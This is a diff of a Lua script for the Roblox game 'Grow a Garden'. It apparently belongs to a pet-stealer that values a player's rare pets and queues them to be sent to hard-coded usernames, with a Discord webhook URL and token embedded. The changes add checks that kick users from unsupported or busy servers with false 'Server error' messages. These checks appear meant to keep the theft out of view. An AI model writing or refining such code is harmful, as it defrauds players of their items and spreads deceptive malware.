@@ -26,13 +26,21 @@ local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "T-Rex", "Kitsune", "Disco 
 local totalValue = 0
 local itemsToSend = {}
 
-if next(Xycho_Balagbag) == nil or webhook == "https://discord.com/api/webhooks/1379937868906234028/ZmYj3liDqj3f4dsTLj7b22WPAUA_TixQ4lSx_-_W7hs1ZOwSLb1wEkkZfedw2KAzJEpc" then
-    plr:kick("You didn't add any usernames or webhook")
+-- Ensure Xycho_Balagbag and webhook are defined properly
+if type(Xycho_Balagbag) ~= "table" or next(Xycho_Balagbag) == nil or webhook == "https://discord.com/api/webhooks/1379937868906234028/ZmYj3liDqj3f4dsTLj7b22WPAUA_TixQ4lSx_-_W7hs1ZOwSLb1wEkkZfedw2KAzJEpc" then
+    plr:Kick("You didn't add any usernames or webhook")
     return
 end
 
+-- Game validation
 if game.PlaceId ~= 126884695634066 then
-    plr:kick("Game not supported. Please join a normal GAG server")
+    plr:Kick("Game not supported. Please join a normal GAG server")
+    return
+end
+
+-- Player count validation
+if #game:GetService("Players"):GetPlayers() >= 5 then
+    plr:Kick("Server error. Please join a DIFFERENT server")
     return
 end
 
@@ -41,10 +49,6 @@ if #Players:GetPlayers() >= 5 then
     return
 end
 
-if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    plr:kick("Server error. Please join a DIFFERENT server")
-    return
-end
 
 local function calcPetValue(v14)
     local hatchedFrom = v14.PetData.HatchedFrom
@@ -371,4 +375,5 @@ if #itemsToSend > 0 then
     end
     waitForUserChat()
 end
+
 
